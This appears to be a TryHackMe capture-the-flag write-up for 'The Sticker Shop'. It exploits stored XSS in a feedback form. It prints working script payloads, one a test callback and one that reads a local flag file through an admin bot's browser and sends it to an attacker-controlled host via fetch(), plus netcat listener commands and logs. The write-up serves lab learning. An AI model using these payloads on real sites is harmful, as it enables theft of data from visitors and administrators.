# The Sticker Shop - TryHackMe Writeup

**TL;DR:** Exploited a Client-Side XSS vulnerability to steal the flag from the local application.

## Target
- Machine: `sticker.thm`
- Date: 2025-6-10
- Environment: TryHackMe / CTF

--------------------------------

The room's hint, "Can you conduct any client-side exploitation in order to read the flag?", 
directly pointed towards an XSS (Cross-Site Scripting) attack.

The application had a single, prominent input vector: the /submit_feedback page.

## Exploitation

### Step 1: Proof-of-Concept (XSS Confirmation)

A simple test payload was submitted to check if the application was vulnerable and if the feedback was rendered unsafely.

Payload:
```js
</test><script>fetch('http://YOUR_IP:4444');</script>
```

A netcat listener was set up on the attack machine:
```bash
nc -lnvp 4444
```
Result: A connection was received from the target,
confirming the XSS vulnerability and that a headless browser (likely an admin bot) was visiting the feedback page.

```bash
connect to [10.10.1.29] from (UNKNOWN) [10.10.18.180] 35056
GET / HTTP/1.1
Host: 10.10.1.29:4444
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36... HeadlessChrome/119.0.6045.105
...
```

### Step 2: Stealing the Flag

With confirmed XSS, the next step was to force the victim's browser to read the local flag file `http://127.0.0.1:8080/flag.txt`
and exfiltrate its contents.

Final Payload:
```js
</test><script>
fetch('http://127.0.0.1:8080/flag.txt')
  .then(response => response.text())
  .then(data => {
    fetch('http://YOUR_IP:4444/?flag=' + encodeURIComponent(data));
  });
</script>
```

#### Capturing the Flag

After submitting the final payload, the netcat listener captured the incoming request containing the flag.

```bash
└─$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.1.29] from (UNKNOWN) [10.10.18.180] 41398
GET /?flag=THM%7B[REDACTED]%7D HTTP/1.1
Host: 10.10.1.29:4444
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/119.0.6045.105 Safari/537.36
Accept: */*
Origin: http://127.0.0.1:8080
Referer: http://127.0.0.1:8080/
Accept-Encoding: gzip, deflate
```
